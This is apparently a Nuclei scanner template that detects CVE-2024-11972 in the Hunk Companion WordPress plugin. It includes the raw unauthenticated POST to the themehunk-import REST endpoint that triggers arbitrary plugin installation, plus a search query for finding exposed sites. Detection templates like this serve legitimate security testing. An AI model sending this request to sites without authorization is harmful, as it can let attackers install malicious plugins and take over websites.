http:
- matchers:
  - part: body_2
    type: word
    words:
    - '"\"https:\\\/\\\/'
  - part: content_type_2
    type: word
    words:
    - application/json
  - status:
    - 200
    type: status
  matchers-condition: and
  raw:
  - 'GET / HTTP/1.1

    Host: {{Hostname}}

    '
  - 'POST /wp-json/hc/v1/themehunk-import HTTP/1.1

    Host: {{Hostname}}

    Content-Type: application/json


    {"params":{"templateType":"free","plugin":{"{{plugin}}": "{{plugin}}"},"allPlugins":[{"{{plugin}}":
    "{{plugin}}/{{plugin}}.php"}]},"headers":{"X-WP-Nonce":"{{x-wp-nonce}}"}}

    '
id: CVE-2024-11972
info:
  author: s4e-io
  classification:
    cpe: cpe:2.3:a:themehunk:hunk_companion:*:*:*:*:*:wordpress:*:*
    cve-id: CVE-2024-11972
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    epss-percentile: 0.99659
    epss-score: 0.91677
  description: 'The plugin does not correctly authorize some REST API endpoints, allowing
    unauthenticated requests to install and activate arbitrary plugins from the WordPress.org
    repo, including vulnerable plugins that have been closed.

    '
  impact: 'Unauthenticated attackers can install and activate arbitrary WordPress
    plugins including vulnerable or malicious ones, leading to potential site compromise.

    '
  metadata:
    fofa-query: body="/wp-content/plugins/hunk-companion/"
    framework: wordpress
    product: hunk_companion
    vendor: themehunk
  name: Hunk Companion < 1.9.0 - Unauthenticated Plugin Installation
  reference:
  - https://wpscan.com/vulnerability/4963560b-e4ae-451d-8f94-482779c415e4/
  - https://github.com/JunTakemura/exploit-CVE-2024-11972
  - https://github.com/Nxploited/CVE-2024-11972-PoC
  - https://github.com/RonF98/CVE-2024-11972-POC
  remediation: 'Update Hunk Companion plugin to version 1.9.0 or later.

    '
  severity: critical
  tags: cve,cve-2024,wordpress,wp,wp-plugin,hunk-companion,vkev,vuln
variables:
  plugin: '{{to_lower(rand_text_alpha(6))}}'
  x-wp-nonce: '{{to_lower(rand_text_alpha(12))}}'
